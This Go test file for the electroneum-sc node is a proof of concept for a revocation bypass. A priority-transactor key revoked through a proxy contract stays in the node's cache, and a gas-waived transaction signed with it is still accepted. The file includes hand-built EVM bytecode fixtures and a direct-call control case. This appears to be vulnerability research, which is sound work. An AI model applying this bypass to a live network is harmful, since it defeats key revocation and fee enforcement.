package core

import (
 "encoding/hex"
 "math/big"
 "strings"
 "testing"

 "github.com/electroneum/electroneum-sc/accounts/abi"
 "github.com/electroneum/electroneum-sc/common"
 "github.com/electroneum/electroneum-sc/contracts/prioritytransactors"
 "github.com/electroneum/electroneum-sc/core/rawdb"
 "github.com/electroneum/electroneum-sc/core/state"
 "github.com/electroneum/electroneum-sc/core/types"
 "github.com/electroneum/electroneum-sc/core/vm"
 "github.com/electroneum/electroneum-sc/crypto"
 "github.com/electroneum/electroneum-sc/params"
)

// registryCode returns ABI-encoded getTransactors() based on storage slot 0.
// A non-get request revokes the key. This is an intentionally synthetic,
// disposable registry fixture, NOT the deployed ETN registry implementation.
func indirectRegistryCode(t *testing.T, priorityPublic string) []byte {
 t.Helper()
 a, err := abi.JSON(strings.NewReader(prioritytransactors.ETNPriorityTransactorsInterfaceMetaData.ABI))
 if err != nil { t.Fatal(err) }
 empty, err := a.Methods["getTransactors"].Outputs.Pack([]prioritytransactors.ETNPriorityTransactorsInterfaceTransactorMeta{})
 if err != nil { t.Fatal(err) }
 allow, err := a.Methods["getTransactors"].Outputs.Pack([]prioritytransactors.ETNPriorityTransactorsInterfaceTransactorMeta{{
  IsGasPriceWaiver: true, PublicKey: priorityPublic, Name: "synthetic-authorized",
 }})
 if err != nil { t.Fatal(err) }
 // selector size 4 -> read; size 1 -> revoke. The branch loads slot0.
 // Layout after header: empty-return branch, authorized-return branch, ABI data.
 b := []byte{0x36,0x60,0x04,0x14,0x60,0x0d,0x57,0x60,0,0x60,0,0x55,0,0x5b,0x60,0,0x54,0x60,0x23,0x57}
 addReturn := func(length int) {
  b=append(b,0x61,byte(length>>8),byte(length),0x61,0,0,0x60,0,0x39,0x61,byte(length>>8),byte(length),0x60,0,0xf3)
 }
 addReturn(len(empty))
 b=append(b,0x5b)
 addReturn(len(allow))
 if len(b)!=51 { t.Fatalf("fixture layout changed: %d",len(b)) }
 emptyPos, allowPos := len(b),len(b)+len(empty)
 b[24],b[25]=byte(emptyPos>>8),byte(emptyPos)
 b[40],b[41]=byte(allowPos>>8),byte(allowPos)
 b=append(b,empty...)
 return append(b,allow...)
}

func indirectProxyCode(registry common.Address) []byte {
 b:=[]byte{0x60,0,0x60,0,0x60,0,0x60,0,0x60,0,0x73}
 b=append(b,registry[:]...)
 return append(b,0x5a,0xf1,0x00)
}

// Tests exact target ApplyTransaction and registry-cache update, not yet a
// consensus-sealed canonical block or mainnet-contract reachability.
func TestResearchIndirectRevocationBypass(t *testing.T) {
 for i:=1; i<=3; i++ {
  for _, viaProxy:=range []bool{false,true} {
   label:="direct";if viaProxy { label="via_proxy" }
   t.Run(label+"_"+string(rune('0'+i)),func(t *testing.T) {
    kb:=make([]byte,32);kb[31]=byte(30+i)
    adminKey,err:=crypto.ToECDSA(kb);if err!=nil {t.Fatal(err)}
    kb[31]=byte(80+i)
    payerKey,err:=crypto.ToECDSA(kb);if err!=nil {t.Fatal(err)}
    kb[31]=byte(120+i)
    waiverKey,err:=crypto.ToECDSA(kb);if err!=nil {t.Fatal(err)}
    admin:=crypto.PubkeyToAddress(adminKey.PublicKey)
    payer:=crypto.PubkeyToAddress(payerKey.PublicKey)
    registry:=common.HexToAddress("0x0000000000000000000000000000000000001234")
    proxy:=common.HexToAddress("0x0000000000000000000000000000000000005678")
    recipient:=common.HexToAddress("0x000000000000000000000000000000000000abcd")
    miner:=common.HexToAddress("0x000000000000000000000000000000000000eeef")
    cfg:=&params.ChainConfig{ChainID:big.NewInt(1337),HomesteadBlock:big.NewInt(0),EIP150Block:big.NewInt(0),EIP155Block:big.NewInt(0),EIP158Block:big.NewInt(0),
     ByzantiumBlock:big.NewInt(0),BerlinBlock:big.NewInt(0),LondonBlock:big.NewInt(0),PriorityTransactorsContractAddress:registry}
    header:=&types.Header{Number:big.NewInt(1),Difficulty:big.NewInt(1),GasLimit:1000000,BaseFee:big.NewInt(1)}
    st,err:=state.New(common.Hash{},state.NewDatabase(rawdb.NewMemoryDatabase()),nil)
    if err!=nil {t.Fatal(err)}
    st.SetBalance(admin,big.NewInt(100000000))
    st.SetBalance(payer,big.NewInt(100000000))
    st.SetState(registry,common.Hash{},common.HexToHash("0x1"))
    st.SetCode(registry,indirectRegistryCode(t,hex.EncodeToString(crypto.FromECDSAPub(&waiverKey.PublicKey))))
    st.SetCode(proxy,indirectProxyCode(registry))
    context:=NewEVMBlockContext(header,nil,&miner)
    liveList:=func() common.PriorityTransactorMap {
     e:=vm.NewEVM(context,vm.TxContext{},st,cfg,vm.Config{})
     return GetPriorityTransactors(e)
    }
    initial:=liveList();if len(initial)!=1 {t.Fatalf("fixture initial list=%d; want 1",len(initial))}
    st.SetPriorityTransactors(initial) // exactly as StateProcessor.Process does at block start
    signer:=types.MakeSigner(cfg,header.Number)
    to:=registry;if viaProxy {to=proxy}
    revoke,err:=types.SignNewTx(adminKey,signer,&types.DynamicFeeTx{ChainID:cfg.ChainID,Nonce:0,GasTipCap:big.NewInt(1),GasFeeCap:big.NewInt(2),Gas:180000,To:&to,Value:big.NewInt(0),Data:[]byte{1}})
    if err!=nil {t.Fatal(err)}
    waiver,err:=types.SignNewPriorityTx(payerKey,waiverKey,signer,&types.PriorityTx{ChainID:cfg.ChainID,Nonce:0,GasTipCap:big.NewInt(0),GasFeeCap:big.NewInt(0),Gas:21000,To:&recipient,Value:big.NewInt(1)})
    if err!=nil {t.Fatal(err)}
    gp:=new(GasPool).AddGas(500000);used:=uint64(0)
    if viaProxy {
     snap := st.Snapshot()
     probe := vm.NewEVM(context, vm.TxContext{}, st, cfg, vm.Config{})
     data, gasLeft, probeErr := probe.Call(vm.AccountRef(admin), proxy, []byte{1}, 150000, big.NewInt(0))
     t.Logf("PROXY_DEBUG probeErr=%v gasLeft=%d data=%x slot=%s", probeErr, gasLeft, data, st.GetState(registry,common.Hash{}))
     st.RevertToSnapshot(snap)
    }
    st.Prepare(revoke.Hash(),0)
    rc,err:=ApplyTransaction(cfg,nil,&miner,gp,st,header,revoke,&used,vm.Config{})
    if err!=nil||rc==nil||rc.Status!=types.ReceiptStatusSuccessful {t.Fatalf("revoke failed receipt=%v err=%v",rc,err)}
    if slot:=st.GetState(registry,common.Hash{});slot!=(common.Hash{}) {t.Fatalf("revocation did not write slot0: %s",slot)}
    if len(liveList())!=0 {t.Fatal("independent contract read did not observe revocation")}
    _,cachePresent:=st.GetPriorityTransactorByKey(common.BytesToPublicKey(crypto.FromECDSAPub(&waiverKey.PublicKey)))
    st.Prepare(waiver.Hash(),1)
    receipt,waiverErr:=ApplyTransaction(cfg,nil,&miner,gp,st,header,waiver,&used,vm.Config{})
    if viaProxy {
     if !cachePresent||waiverErr!=nil||receipt==nil||receipt.Status!=types.ReceiptStatusSuccessful {
      t.Fatalf("indirect stale-key transaction not accepted: cache=%v err=%v receipt=%v",cachePresent,waiverErr,receipt)
     }
     if st.GetBalance(recipient).Cmp(big.NewInt(1))!=0 {t.Fatal("recipient not credited")}
     t.Logf("POC_INDIRECT_ACCEPTED revoked_registry=1 stale_cached_key=1 receipt_status=%d recipient_delta=1 gas_waived=1",receipt.Status)
    } else {
     if cachePresent||waiverErr==nil||receipt!=nil {t.Fatalf("direct guard failed cache=%v err=%v receipt=%v",cachePresent,waiverErr,receipt)}
     if st.GetBalance(recipient).Sign()!=0 {t.Fatal("direct negative control credited recipient")}
     t.Logf("POC_DIRECT_REJECTED revoked_registry=1 refreshed_cached_key=0 err=%v",waiverErr)
    }
   })
  }
 }
}
